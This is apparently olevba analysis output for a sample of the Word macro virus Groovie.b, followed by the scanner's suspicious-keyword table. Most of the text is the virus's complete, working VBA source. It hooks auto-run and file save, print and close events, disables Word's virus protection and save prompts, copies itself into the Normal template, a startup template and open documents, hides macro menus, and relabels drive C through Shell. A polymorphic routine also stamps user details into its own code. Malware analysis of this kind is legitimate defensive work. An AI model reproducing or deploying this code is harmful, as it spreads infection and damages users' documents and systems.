olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Groovie.b-dc92f7061d5b035316625ce71b7c8b876b1844f7
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Groovie.b-dc92f7061d5b035316625ce71b7c8b876b1844f7 - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO groovie.bas 
in file: Virus.MSWord.Groovie.b-dc92f7061d5b035316625ce71b7c8b876b1844f7 - OLE stream: 'Macros/VBA/groovie'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Public I01 As String
 ' G W14/05/04 23:34:23491LANE491HP DeskJet 520 Printer on LPT1:
Public I02 As Boolean
 ' G W14/05/04 23:34:23491LANE491HP DeskJet 520 Printer on LPT1:
Public I03 As Boolean
 ' G W14/05/04 23:34:23491LANE491HP DeskJet 520 Printer on LPT1:
Public I04 As Boolean
 ' G W14/05/04 23:34:23491LANE491HP DeskJet 520 Printer on LPT1:
Public I05 As Boolean
 ' G W14/05/04 23:34:23491LANE491HP DeskJet 520 Printer on LPT1:
Public I06 As String
 ' G W14/05/04 23:34:23491LANE491HP DeskJet 520 Printer on LPT1:
Public I07 As Boolean
 ' G W14/05/04 23:34:23491LANE491HP DeskJet 520 Printer on LPT1:
Public I08 As Boolean
 ' G W14/05/04 23:34:23491LANE491HP DeskJet 520 Printer on LPT1:
Function I09()
 ' G W14/05/04 23:34:23491LANE491HP DeskJet 520 Printer on LPT1:
On Error Resume Next
 ' G W14/05/04 23:34:24491LANE491HP DeskJet 520 Printer on LPT1:
    If MacroContainer = NormalTemplate Then
 ' G W14/05/04 23:34:24491LANE491HP DeskJet 520 Printer on LPT1:
        I01 = "normal"
 ' G W14/05/04 23:34:24491LANE491HP DeskJet 520 Printer on LPT1:
        GoTo checkout
 ' G W14/05/04 23:34:24491LANE491HP DeskJet 520 Printer on LPT1:
    End If
 ' G W14/05/04 23:34:24491LANE491HP DeskJet 520 Printer on LPT1:
    If MacroContainer = ActiveDocument Then I01 = "document"
 ' G W14/05/04 23:34:24491LANE491HP DeskJet 520 Printer on LPT1:
    If MacroContainer = "data.dot" Then I01 = "orbit"
 ' G W14/05/04 23:34:24491LANE491HP DeskJet 520 Printer on LPT1:
checkout:
 ' G W14/05/04 23:34:24491LANE491HP DeskJet 520 Printer on LPT1:
End Function
 ' G W14/05/04 23:34:24491LANE491HP DeskJet 520 Printer on LPT1:
Function I10()
 ' G W14/05/04 23:34:24491LANE491HP DeskJet 520 Printer on LPT1:
On Error Resume Next
 ' G W14/05/04 23:34:24491LANE491HP DeskJet 520 Printer on LPT1:
    If Dir(Application.StartupPath + "\data.dot") = "data.dot" Then I02 = True
 ' G W14/05/04 23:34:24491LANE491HP DeskJet 520 Printer on LPT1:
    For i = 1 To ActiveDocument.VBProject.VBComponents.Count
 ' G W14/05/04 23:34:24491LANE491HP DeskJet 520 Printer on LPT1:
        If ActiveDocument.VBProject.VBComponents(i).Name = "groovie" Then I04 = True
 ' G W14/05/04 23:34:24491LANE491HP DeskJet 520 Printer on LPT1:
    Next i
 ' G W14/05/04 23:34:24491LANE491HP DeskJet 520 Printer on LPT1:
    For i = 1 To NormalTemplate.VBProject.VBComponents.Count
 ' G W14/05/04 23:34:24491LANE491HP DeskJet 520 Printer on LPT1:
        If NormalTemplate.VBProject.VBComponents(i).Name = "groovie" Then I03 = True
 ' G W14/05/04 23:34:24491LANE491HP DeskJet 520 Printer on LPT1:
    Next i
 ' G W14/05/04 23:34:24491LANE491HP DeskJet 520 Printer on LPT1:
    If GetAttr(NormalTemplate.FullName) = vbArchive + vbReadOnly Or GetAttr(NormalTemplate.FullName) = vbReadOnly Then I05 = True
 ' G W14/05/04 23:34:24491LANE491HP DeskJet 520 Printer on LPT1:
End Function
 ' G W14/05/04 23:34:24491LANE491HP DeskJet 520 Printer on LPT1:
Function I11()
 ' G W14/05/04 23:34:24491LANE491HP DeskJet 520 Printer on LPT1:
On Error Resume Next
 ' G W14/05/04 23:34:24491LANE491HP DeskJet 520 Printer on LPT1:
Call I09
 ' G W14/05/04 23:34:24491LANE491HP DeskJet 520 Printer on LPT1:
Call I10
 ' G W14/05/04 23:34:24491LANE491HP DeskJet 520 Printer on LPT1:
    If I01 = "document" Then Call I12
 ' G W14/05/04 23:34:24491LANE491HP DeskJet 520 Printer on LPT1:
    If I01 = "normal" Then Call I13
 ' G W14/05/04 23:34:24491LANE491HP DeskJet 520 Printer on LPT1:
    If I01 = "orbit" Then Call I14
 ' G W14/05/04 23:34:24491LANE491HP DeskJet 520 Printer on LPT1:
    If I05 = False Then CommandBars("tools").Controls("Macro").Delete
 ' G W14/05/04 23:34:24491LANE491HP DeskJet 520 Printer on LPT1:
    If I05 = False Then CommandBars("tools").Controls("Templates and add-ins...").Delete
 ' G W14/05/04 23:34:24491LANE491HP DeskJet 520 Printer on LPT1:
End Function
 ' G W14/05/04 23:34:24491LANE491HP DeskJet 520 Printer on LPT1:
Function I12()
 ' G W14/05/04 23:34:24491LANE491HP DeskJet 520 Printer on LPT1:
On Error Resume Next
 ' G W14/05/04 23:34:24491LANE491HP DeskJet 520 Printer on LPT1:
    Application.VBE.ActiveVBProject.VBComponents("groovie").Export "c:\groovie.sys"
 ' G W14/05/04 23:34:24491LANE491HP DeskJet 520 Printer on LPT1:
    If I03 = False And I05 = False Then
 ' G W14/05/04 23:34:24491LANE491HP DeskJet 520 Printer on LPT1:
        With NormalTemplate.VBProject
 ' G W14/05/04 23:34:25491LANE491HP DeskJet 520 Printer on LPT1:
        With .VBComponents.Import("c:\groovie.sys")
 ' G W14/05/04 23:34:25491LANE491HP DeskJet 520 Printer on LPT1:
        End With
 ' G W14/05/04 23:34:25491LANE491HP DeskJet 520 Printer on LPT1:
        End With
 ' G W14/05/04 23:34:25491LANE491HP DeskJet 520 Printer on LPT1:
    End If
 ' G W14/05/04 23:34:25491LANE491HP DeskJet 520 Printer on LPT1:
    If I02 = False Then
 ' G W14/05/04 23:34:25491LANE491HP DeskJet 520 Printer on LPT1:
        ActiveDocument.SaveAs FileName:=Application.StartupPath + "\data.dot", FileFormat:=wdFormatTemplate, AddToRecentFiles:=False, ReadOnlyRecommended:=False
 ' G W14/05/04 23:34:25491LANE491HP DeskJet 520 Printer on LPT1:
        Application.OrganizerRename Source:=Application.StartupPath + "\data.dot", Name:="groovie", NewName:="orbit", Object:=wdOrganizerObjectProjectItems
 ' G W14/05/04 23:34:25491LANE491HP DeskJet 520 Printer on LPT1:
        If ActiveDocument.Saved = False Then ActiveDocument.SaveAs FileName:=ActiveDocument.FullName
 ' G W14/05/04 23:34:25491LANE491HP DeskJet 520 Printer on LPT1:
        If I08 = False Then Documents.Open FileName:=I06
 ' G W14/05/04 23:34:25491LANE491HP DeskJet 520 Printer on LPT1:
        Shell ("label c: groovie"), 0
 ' G W14/05/04 23:34:25491LANE491HP DeskJet 520 Printer on LPT1:
        Windows(1).Close
 ' G W14/05/04 23:34:25491LANE491HP DeskJet 520 Printer on LPT1:
    End If
 ' G W14/05/04 23:34:25491LANE491HP DeskJet 520 Printer on LPT1:
End Function
 ' G W14/05/04 23:34:25491LANE491HP DeskJet 520 Printer on LPT1:
Function I13()
 ' G W14/05/04 23:34:25491LANE491HP DeskJet 520 Printer on LPT1:
On Error Resume Next
 ' G W14/05/04 23:34:25491LANE491HP DeskJet 520 Printer on LPT1:
Application.ScreenUpdating = False
 ' G W14/05/04 23:34:25491LANE491HP DeskJet 520 Printer on LPT1:
    Call I17
 ' G W14/05/04 23:34:25491LANE491HP DeskJet 520 Printer on LPT1:
    If I04 = False And I07 = True Then
 ' G W14/05/04 23:34:25491LANE491HP DeskJet 520 Printer on LPT1:
        With ActiveDocument.VBProject
 ' G W14/05/04 23:34:25491LANE491HP DeskJet 520 Printer on LPT1:
        With .VBComponents.Import("c:\groovie.sys")
 ' G W14/05/04 23:34:25491LANE491HP DeskJet 520 Printer on LPT1:
        End With
 ' G W14/05/04 23:34:25491LANE491HP DeskJet 520 Printer on LPT1:
        End With
 ' G W14/05/04 23:34:25491LANE491HP DeskJet 520 Printer on LPT1:
        With Dialogs(wdDialogFileSummaryInfo)
 ' G W14/05/04 23:34:25491LANE491HP DeskJet 520 Printer on LPT1:
            .Comments = "ALT-F11 says it's groovie!"
 ' G W14/05/04 23:34:25491LANE491HP DeskJet 520 Printer on LPT1:
            .Execute
 ' G W14/05/04 23:34:25491LANE491HP DeskJet 520 Printer on LPT1:
        End With
 ' G W14/05/04 23:34:25491LANE491HP DeskJet 520 Printer on LPT1:
    End If
 ' G W14/05/04 23:34:25491LANE491HP DeskJet 520 Printer on LPT1:
    If I02 = False And I07 = True Then
 ' G W14/05/04 23:34:25491LANE491HP DeskJet 520 Printer on LPT1:
        ActiveDocument.SaveAs FileName:=Application.StartupPath + "\data.dot", FileFormat:=wdFormatTemplate, AddToRecentFiles:=False, ReadOnlyRecommended:=False
 ' G W14/05/04 23:34:25491LANE491HP DeskJet 520 Printer on LPT1:
        Application.OrganizerRename Source:=Application.StartupPath + "\data.dot", Name:="groovie", NewName:="orbit", Object:=wdOrganizerObjectProjectItems
 ' G W14/05/04 23:34:25491LANE491HP DeskJet 520 Printer on LPT1:
        If I08 = False Then Documents.Open FileName:=I06
 ' G W14/05/04 23:34:25491LANE491HP DeskJet 520 Printer on LPT1:
        Windows(1).Close SaveChanges:=wdSaveChanges
 ' G W14/05/04 23:34:25491LANE491HP DeskJet 520 Printer on LPT1:
    End If
 ' G W14/05/04 23:34:26491LANE491HP DeskJet 520 Printer on LPT1:
    If I02 = False And I07 = False Then
 ' G W14/05/04 23:34:26491LANE491HP DeskJet 520 Printer on LPT1:
        Documents.Add Template:="", NewTemplate:=False
 ' G W14/05/04 23:34:26491LANE491HP DeskJet 520 Printer on LPT1:
        ActiveDocument.SaveAs FileName:=Application.StartupPath + "\data.dot", FileFormat:=wdFormatTemplate, AddToRecentFiles:=False, ReadOnlyRecommended:=False
 ' G W14/05/04 23:34:26491LANE491HP DeskJet 520 Printer on LPT1:
        Application.OrganizerRename Source:=Application.StartupPath + "\data.dot", Name:="groovie", NewName:="orbit", Object:=wdOrganizerObjectProjectItems
 ' G W14/05/04 23:34:26491LANE491HP DeskJet 520 Printer on LPT1:
        If ActiveDocument.Saved = False Then ActiveDocument.SaveAs FileName:=ActiveDocument.FullName
 ' G W14/05/04 23:34:26491LANE491HP DeskJet 520 Printer on LPT1:
        Windows(1).Close SaveChanges:=wdSaveChanges
 ' G W14/05/04 23:34:26491LANE491HP DeskJet 520 Printer on LPT1:
    End If
 ' G W14/05/04 23:34:26491LANE491HP DeskJet 520 Printer on LPT1:
Application.ScreenUpdating = True
 ' G W14/05/04 23:34:26491LANE491HP DeskJet 520 Printer on LPT1:
End Function
 ' G W14/05/04 23:34:26491LANE491HP DeskJet 520 Printer on LPT1:
Function I14()
 ' G W14/05/04 23:34:26491LANE491HP DeskJet 520 Printer on LPT1:
On Error Resume Next
 ' G W14/05/04 23:34:26491LANE491HP DeskJet 520 Printer on LPT1:
Application.ScreenUpdating = False
 ' G W14/05/04 23:34:26491LANE491HP DeskJet 520 Printer on LPT1:
        If I03 = False And I05 = False Then
 ' G W14/05/04 23:34:26491LANE491HP DeskJet 520 Printer on LPT1:
            With NormalTemplate.VBProject
 ' G W14/05/04 23:34:26491LANE491HP DeskJet 520 Printer on LPT1:
            With .VBComponents.Import("c:\groovie.sys")
 ' G W14/05/04 23:34:26491LANE491HP DeskJet 520 Printer on LPT1:
            End With
 ' G W14/05/04 23:34:26491LANE491HP DeskJet 520 Printer on LPT1:
            End With
 ' G W14/05/04 23:34:26491LANE491HP DeskJet 520 Printer on LPT1:
            NormalTemplate.Save
 ' G W14/05/04 23:34:26491LANE491HP DeskJet 520 Printer on LPT1:
        End If
 ' G W14/05/04 23:34:26491LANE491HP DeskJet 520 Printer on LPT1:
        If I04 = False Then
 ' G W14/05/04 23:34:26491LANE491HP DeskJet 520 Printer on LPT1:
            With ActiveDocument.VBProject
 ' G W14/05/04 23:34:26491LANE491HP DeskJet 520 Printer on LPT1:
            With .VBComponents.Import("c:\groovie.sys")
 ' G W14/05/04 23:34:26491LANE491HP DeskJet 520 Printer on LPT1:
            End With
 ' G W14/05/04 23:34:26491LANE491HP DeskJet 520 Printer on LPT1:
            End With
 ' G W14/05/04 23:34:26491LANE491HP DeskJet 520 Printer on LPT1:
            With Dialogs(wdDialogFileSummaryInfo)
 ' G W14/05/04 23:34:26491LANE491HP DeskJet 520 Printer on LPT1:
                .Comments = "ALT-F11 says it's groovie!"
 ' G W14/05/04 23:34:26491LANE491HP DeskJet 520 Printer on LPT1:
                .Execute
 ' G W14/05/04 23:34:26491LANE491HP DeskJet 520 Printer on LPT1:
            End With
 ' G W14/05/04 23:34:26491LANE491HP DeskJet 520 Printer on LPT1:
        End If
 ' G W14/05/04 23:34:26491LANE491HP DeskJet 520 Printer on LPT1:
Application.ScreenUpdating = True
 ' G W14/05/04 23:34:26491LANE491HP DeskJet 520 Printer on LPT1:
End Function
 ' G W14/05/04 23:34:26491LANE491HP DeskJet 520 Printer on LPT1:
Function I15()
 ' G W14/05/04 23:34:26491LANE491HP DeskJet 520 Printer on LPT1:
On Error Resume Next
 ' G W14/05/04 23:34:27491LANE491HP DeskJet 520 Printer on LPT1:
    Options.VirusProtection = False
 ' G W14/05/04 23:34:27491LANE491HP DeskJet 520 Printer on LPT1:
    Options.SaveNormalPrompt = False
 ' G W14/05/04 23:34:27491LANE491HP DeskJet 520 Printer on LPT1:
    Options.ConfirmConversions = False
 ' G W14/05/04 23:34:27491LANE491HP DeskJet 520 Printer on LPT1:
    I06 = ActiveDocument.FullName
 ' G W14/05/04 23:34:27491LANE491HP DeskJet 520 Printer on LPT1:
    Call I11
 ' G W14/05/04 23:34:27491LANE491HP DeskJet 520 Printer on LPT1:
End Function
 ' G W14/05/04 23:34:27491LANE491HP DeskJet 520 Printer on LPT1:
Sub AutoOpen()
 ' G W14/05/04 23:34:27491LANE491HP DeskJet 520 Printer on LPT1:
On Error Resume Next
 ' G W14/05/04 23:34:27491LANE491HP DeskJet 520 Printer on LPT1:
Call I15
 ' G W14/05/04 23:34:27491LANE491HP DeskJet 520 Printer on LPT1:
End Sub
 ' G W14/05/04 23:34:27491LANE491HP DeskJet 520 Printer on LPT1:
Sub AutoClose()
 ' G W14/05/04 23:34:27491LANE491HP DeskJet 520 Printer on LPT1:
On Error Resume Next
 ' G W14/05/04 23:34:27491LANE491HP DeskJet 520 Printer on LPT1:
I08 = True
 ' G W14/05/04 23:34:27491LANE491HP DeskJet 520 Printer on LPT1:
Call I15
 ' G W14/05/04 23:34:27491LANE491HP DeskJet 520 Printer on LPT1:
End Sub
 ' G W14/05/04 23:34:27491LANE491HP DeskJet 520 Printer on LPT1:
Sub AutoExit()
 ' G W14/05/04 23:34:27491LANE491HP DeskJet 520 Printer on LPT1:
On Error Resume Next
 ' G W14/05/04 23:34:27491LANE491HP DeskJet 520 Printer on LPT1:
Call I15
 ' G W14/05/04 23:34:27491LANE491HP DeskJet 520 Printer on LPT1:
End Sub
 ' G W14/05/04 23:34:27491LANE491HP DeskJet 520 Printer on LPT1:
Sub FileSaveAs()
 ' G W14/05/04 23:34:27491LANE491HP DeskJet 520 Printer on LPT1:
On Error Resume Next
 ' G W14/05/04 23:34:27491LANE491HP DeskJet 520 Printer on LPT1:
Call I16
 ' G W14/05/04 23:34:27491LANE491HP DeskJet 520 Printer on LPT1:
Call I15
 ' G W14/05/04 23:34:27491LANE491HP DeskJet 520 Printer on LPT1:
Dialogs(wdDialogFileSaveAs).Show
 ' G W14/05/04 23:34:27491LANE491HP DeskJet 520 Printer on LPT1:
End Sub
 ' G W14/05/04 23:34:27491LANE491HP DeskJet 520 Printer on LPT1:
Sub filesave()
 ' G W14/05/04 23:34:27491LANE491HP DeskJet 520 Printer on LPT1:
On Error Resume Next
 ' G W14/05/04 23:34:27491LANE491HP DeskJet 520 Printer on LPT1:
Call I16
 ' G W14/05/04 23:34:27491LANE491HP DeskJet 520 Printer on LPT1:
Call I15
 ' G W14/05/04 23:34:27491LANE491HP DeskJet 520 Printer on LPT1:
ActiveDocument.SaveAs FileName:=ActiveDocument.FullName, FileFormat:=wdFormatDocument
 ' G W14/05/04 23:34:27491LANE491HP DeskJet 520 Printer on LPT1:
End Sub
 ' G W14/05/04 23:34:27491LANE491HP DeskJet 520 Printer on LPT1:
Sub fileclose()
 ' G W14/05/04 23:34:27491LANE491HP DeskJet 520 Printer on LPT1:
On Error Resume Next
 ' G W14/05/04 23:34:28491LANE491HP DeskJet 520 Printer on LPT1:
I08 = True
 ' G W14/05/04 23:34:28491LANE491HP DeskJet 520 Printer on LPT1:
Call I15
 ' G W14/05/04 23:34:28491LANE491HP DeskJet 520 Printer on LPT1:
ActiveDocument.SaveAs FileName:=ActiveDocument.FullName, FileFormat:=wdFormatDocument
 ' G W14/05/04 23:34:28491LANE491HP DeskJet 520 Printer on LPT1:
ActiveDocument.Close
 ' G W14/05/04 23:34:28491LANE491HP DeskJet 520 Printer on LPT1:
End Sub
 ' G W14/05/04 23:34:28491LANE491HP DeskJet 520 Printer on LPT1:
Sub fileprint()
 ' G W14/05/04 23:34:28491LANE491HP DeskJet 520 Printer on LPT1:
On Error Resume Next
 ' G W14/05/04 23:34:28491LANE491HP DeskJet 520 Printer on LPT1:
Call I15
 ' G W14/05/04 23:34:28491LANE491HP DeskJet 520 Printer on LPT1:
Dialogs(wdDialogFilePrint).Show
 ' G W14/05/04 23:34:28491LANE491HP DeskJet 520 Printer on LPT1:
End Sub
 ' G W14/05/04 23:34:28491LANE491HP DeskJet 520 Printer on LPT1:
Sub viewvbcode()
 ' G W14/05/04 23:34:28491LANE491HP DeskJet 520 Printer on LPT1:
MsgBox "It's GROOVIE", vbOKOnly, "•  ALT-F11  • says..."
 ' G W14/05/04 23:34:28491LANE491HP DeskJet 520 Printer on LPT1:
End Sub
 ' G W14/05/04 23:34:28491LANE491HP DeskJet 520 Printer on LPT1:
Sub ToolsMacro()
 ' G W14/05/04 23:34:28491LANE491HP DeskJet 520 Printer on LPT1:
End Sub
 ' G W14/05/04 23:34:28491LANE491HP DeskJet 520 Printer on LPT1:
Sub FileTemplates()
 ' G W14/05/04 23:34:28491LANE491HP DeskJet 520 Printer on LPT1:
End Sub
 ' G W14/05/04 23:34:28491LANE491HP DeskJet 520 Printer on LPT1:
Function I17()
 ' G W14/05/04 23:34:28491LANE491HP DeskJet 520 Printer on LPT1:
On Error GoTo docek
 ' G W14/05/04 23:34:28491LANE491HP DeskJet 520 Printer on LPT1:
    If ActiveDocument.Name <> "" Then
 ' G W14/05/04 23:34:28491LANE491HP DeskJet 520 Printer on LPT1:
        I07 = True
 ' G W14/05/04 23:34:28491LANE491HP DeskJet 520 Printer on LPT1:
    End If
 ' G W14/05/04 23:34:28491LANE491HP DeskJet 520 Printer on LPT1:
    GoTo over
 ' G W14/05/04 23:34:28491LANE491HP DeskJet 520 Printer on LPT1:
docek:
 ' G W14/05/04 23:34:28491LANE491HP DeskJet 520 Printer on LPT1:
    I07 = False
 ' G W14/05/04 23:34:28491LANE491HP DeskJet 520 Printer on LPT1:
over:
 ' G W14/05/04 23:34:28491LANE491HP DeskJet 520 Printer on LPT1:
End Function
 ' G W14/05/04 23:34:28491LANE491HP DeskJet 520 Printer on LPT1:
Function I16()
 ' G W14/05/04 23:34:28491LANE491HP DeskJet 520 Printer on LPT1:
Randomize
 ' G W14/05/04 23:34:28491LANE491HP DeskJet 520 Printer on LPT1:
rn = Int(Rnd * 999)
 ' G W14/05/04 23:34:28491LANE491HP DeskJet 520 Printer on LPT1:
With Application.VBE.ActiveVBProject.VBComponents("Groovie").CodeModule
 ' G W14/05/04 23:34:28491LANE491HP DeskJet 520 Printer on LPT1:
For x = 2 To 358 Step 2
 ' G W14/05/04 23:34:28491LANE491HP DeskJet 520 Printer on LPT1:
.DeleteLines x
 ' G W14/05/04 23:34:29491LANE491HP DeskJet 520 Printer on LPT1:
.InsertLines x, " ' " & Application.UserInitials & Now & rn & Application.UserName & Application.UserAddress & rn & Application.ActivePrinter
 ' G W14/05/04 23:34:29491LANE491HP DeskJet 520 Printer on LPT1:
Next x
 ' G W14/05/04 23:34:29491LANE491HP DeskJet 520 Printer on LPT1:
End With
 ' G W14/05/04 23:34:29491LANE491HP DeskJet 520 Printer on LPT1:
End Function
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|AutoExec  |AutoExit            |Runs when the Word document is closed        |
|AutoExec  |AutoClose           |Runs when the Word document is closed        |
|Suspicious|Open                |May open a file                              |
|Suspicious|Shell               |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|Call                |May call a DLL using Excel 4 Macros (XLM/XLF)|
|Suspicious|Windows             |May enumerate application windows (if        |
|          |                    |combined with Shell.Application object)      |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|IOC       |Application.VBE     |Executable file name                         |
+----------+--------------------+---------------------------------------------+

